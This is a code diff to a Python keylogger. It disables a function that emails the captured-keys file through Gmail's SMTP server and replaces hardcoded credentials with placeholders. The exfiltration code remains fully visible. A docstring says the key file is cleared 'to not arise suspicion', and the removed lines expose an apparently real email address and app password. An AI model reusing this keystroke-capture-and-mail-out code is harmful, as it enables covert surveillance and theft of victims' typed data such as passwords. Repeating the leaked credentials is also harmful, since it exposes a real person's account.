@@ -122,19 +122,18 @@ def searchFile(start: str, target: str) -> Union[str, None]:
             return os.path.join(root, target)
     return None
 
-def sendEmail() -> None:
-    """
+"""def sendEmail() -> None:
+
     Send email with current text in the keylogger file
-    """
     # Add Mail Configuration
     smtp_server: str = "smtp.gmail.com"
     smtp_port: int = 587
-    smtp_username: str = "kevincisneros29@gmail.com"
-    smtp_password: str = "efoquexlcrmwithg"
+    smtp_username: str = "USERNAME HERE"
+    smtp_password: str = "PASSWORD HERE"
 
     # Email Content
-    sender: str = "kevincisneros29@gmail.com"
-    recipient: str = "kevincisneros29@duck.com"
+    sender: str = "USERNAME HERE"
+    recipient: str = "RECIPIENT EMAIL HERE"
     subject: str = "New Keys"
     body: str = ""
 
@@ -145,7 +144,7 @@ def sendEmail() -> None:
     message['To'] = recipient
 
     # Add the email body
-    message.attach(MIMEText(body, 'plain'))\
+    message.attach(MIMEText(body, 'plain'))
     
     # Attach the file
     attachment = open(FILEPATH, 'rb')
@@ -170,14 +169,14 @@ def sendEmail() -> None:
         print('An error occurred while sending the email:', str(e))
     finally:
         # Close the connection to the SMTP server
-        server.quit()
+        server.quit()"""
 
 def clear():
     """
     Function sends the text file as an email to personal email
     and then clears out the current keys in the text file to not arise suspicion
     """
-    sendEmail()
+    #sendEmail()
     with open(FILEPATH, "w") as keyFile:
         keyFile.truncate(0)
 
